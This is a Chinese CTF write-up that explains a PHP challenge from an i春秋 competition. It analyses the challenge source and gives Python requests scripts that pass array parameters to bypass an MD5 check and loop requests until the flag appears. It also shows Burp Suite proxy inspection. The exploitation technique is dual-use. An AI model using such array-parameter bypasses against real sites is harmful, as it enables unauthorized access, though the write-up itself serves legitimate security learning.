---
title: 【i春秋】 Web —— 爆破-3
copyright: true
date: 2018-09-11 23:06:53
tags: [i春秋,CTF,Writeup,Web,Audit,PHP,Python,HTTP]
categories: [InfoSec,Web]
---

# 0x00 前言

此题出自「百度杯」CTF 比赛 2017 二月场，是第三道 「爆破」系列的 Web 题，主要考察在理解了题目 PHP 代码的逻辑后，**通过网络编程与服务器交互获取 flag** 的能力，难度中低，需要的基础知识有：**PHP、Python、HTTP协议**。

题目链接在「i春秋」的 CTF 大本营，解题链接通过创建在线靶场后得到：

- 题目链接：[https://www.ichunqiu.com/battalion?t=1&r=57475](https://www.ichunqiu.com/battalion?t=1&r=57475)

<!-- more -->

![question](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_3/question.png)

# 0x01 理解 PHP 代码逻辑

打开链接，发现本题的 PHP 源码比前两题要复杂，做审计题首先是要理解代码逻辑：

```php
<?php 
error_reporting(0);
session_start();
require('./flag.php');
if(!isset($_SESSION['nums'])){
  $_SESSION['nums'] = 0;
  $_SESSION['time'] = time();
  $_SESSION['whoami'] = 'ea';
}

if($_SESSION['time']+120<time()){
  session_destroy();
}

$value = $_REQUEST['value'];
$str_rand = range('a', 'z');
$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];

if($_SESSION['whoami']==($value[0].$value[1]) && substr(md5($value),5,4)==0){
  $_SESSION['nums']++;
  $_SESSION['whoami'] = $str_rands;
  echo $str_rands;
}

if($_SESSION['nums']>=10){
  echo $flag;
}

show_source(__FILE__);
?>
```

- Line 3~9：开始会话，包含 flag.php 文件，为超级全局变量 [`$_SESSION`](http://php.net/manual/en/reserved.variables.session.php) 的三个参数初始化。
- Line 11~13：若 Session 有效期超过了两分钟，则销毁当前会话。
- Line 15~17：先通过 GET 请求或 POST 请求获取的 `value` 参数，再随机选择两个小写字母拼接成字符串。
- Line 19~23：若 `$_SESSION['whoami']` 等于 `$value` 数组中两个元素的拼接，并且 `$value` 的 MD5 哈希值的第 5~8 位等于 0，则将 `$_SESSION['nums']` 自增，将 `$_SESSION['whoami']` 更新为随机字符串并输出。
- Line 25~27：若 `$_SESSION['nums']` 大于等于 10，则输出 flag。

理解了代码逻辑后，再结合提示，基本可判断此题真的需要通过网络交互，来「爆破」获取 flag。

# 0x02 编写 Python 网络通信脚本

本题的难点是**如何通过 GET 或 POST 请求，传送同一数组参数的不同元素值**。常见方法有以下两种：

- `value[]=e&value[]=a`
- `value[0]=e&value[1]=a`

使用 Firefox 浏览器，针对 GET 请求进行验证。第一种方法：

![method1](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_3/method1.png)

第二种方法：

![method2](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_3/method2.png)

针对 POST 请求同样适用，请读者自行验证。

将页面显示的新值传入 `value` 参数后，按上述方法手动循环 10 次，即可满足输出 flag 的条件，但只仅对于次数少的情况有效，如果循环 100 次，还想继续手动操作吗？这时，使用 Python 的**第三方开源库 [Requests](https://2.python-requests.org/en/master/)** 编写自动化脚本，即可轻松解决问题，基本用法可参考：

> [详解 CTF Web 中的快速反弹 POST 请求](https://ciphersaw.github.io/2017/12/16/%E8%AF%A6%E8%A7%A3%20CTF%20Web%20%E4%B8%AD%E7%9A%84%E5%BF%AB%E9%80%9F%E5%8F%8D%E5%BC%B9%20POST%20%E8%AF%B7%E6%B1%82/)

以下是针对 GET 请求构造的 Python 解题脚本：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests

url = "http://2428bbb29ccc4976b0d6d3f5630e3d0a215aedbbe5bf457e.game.ichunqiu.com/"
s = requests.Session()
whoami = "ea"
for i in range(10):
	print(whoami)
	payload = "?value[0]={}&value[1]={}".format(whoami[0], whoami[1])
	response = s.get(url + payload)
	whoami = response.text[:2]
print(response.text)
```

- Line 8~12：自动循环提交 10 次 GET 请求，并输出每次循环的 `value` 参数。
- Line 13：将最后一次响应的报文内容输出，即可看到 flag。

![flag](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_3/flag.png)

将第 10 行改为 `payload = "?value[]={}&value[]={}".format(whoami[0], whoami[1])` 同样能获得 flag。

# 0x03 使用 BurpSuite 抓取 Python 流量数据

针对 GET 请求直接构造字符串 payload 相对简单，如果使用 POST 请求，还需要构造表单数据的 `dict` 类型变量。以下是针对 POST 请求构造的 Python 解题脚本：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests

url = "http://2428bbb29ccc4976b0d6d3f5630e3d0a215aedbbe5bf457e.game.ichunqiu.com/"
s = requests.Session()
whoami = "ea"
for i in range(10):
	print(whoami)
	payload = {"value[0]": whoami[0], "value[1]": whoami[1]} 
	response = s.post(url, data = payload)
	whoami = response.text[:2]
print(response.text)
```

显而易见，只有第 10、11 行与 GET 请求不同，运行完上述脚本后也能获得 flag。不过，当我们依葫芦画瓢将第 10 行改为 `payload = {"value[]": whoami[0], "value[]": whoami[1]} ` 后，却发现无法获得 flag 了：

![flag_failure](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_3/flag_failure.png)

借此机会，讲解一下如何使用 Burp Suite 抓取 Python 发送的网络请求包，相信大家看到请求包后，答案便一目了然。以下是利用代理抓取 POST 请求包的 Python 脚本：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests

url = "http://2428bbb29ccc4976b0d6d3f5630e3d0a215aedbbe5bf457e.game.ichunqiu.com/"
s = requests.Session()
whoami = "ea"
payload = {"value[]": whoami[0], "value[]": whoami[1]} 
burp = {"http": "127.0.0.1:8080"}
response = s.post(url, data = payload, proxies = burp)
```

- 构造 POST 请求中 [`proxies` 代理参数](https://2.python-requests.org//en/master/user/advanced/#proxies)的 `dict` 类型变量，其中 `http` 是代理访问 URL 的协议类型，`127.0.0.1:8080` 是 Burp Suite 的本地监听地址与端口号。

将 Burp Suite 开启 Intercept 模式，运行上述脚本即可看到：

![burp_failure](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_3/burp_failure.png)

可发现表单数据只剩 `value[]=a`，原来前面 `value[]=e` 的值已被覆盖。那么问题来了，如何构造 POST 请求中不带索引的同一数组参数的不同值呢？

正确的构造方法是 `payload = {"value[]": [whoami[0], whoami[1]]} ` ，再次运行脚本，即可看到表单数据正常提交了：

![burp_success](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_3/burp_success.png)

其实，使用 requests 模块自带的方法也能查看请求头与请求体，对应的 Python 脚本如下：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests

url = 'http://2428bbb29ccc4976b0d6d3f5630e3d0a215aedbbe5bf457e.game.ichunqiu.com/'
s = requests.Session()
whoami = "ea"
payload = {"value[]": [whoami[0], whoami[1]]} 
response = s.post(url, data = payload)
print(response.request.headers)
print(response.request.body)
```

运行后即可在终端上看到请求头与请求体：

![requests_body](https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/i%E6%98%A5%E7%A7%8B_Web_%E7%88%86%E7%A0%B4_3/requests_body.png)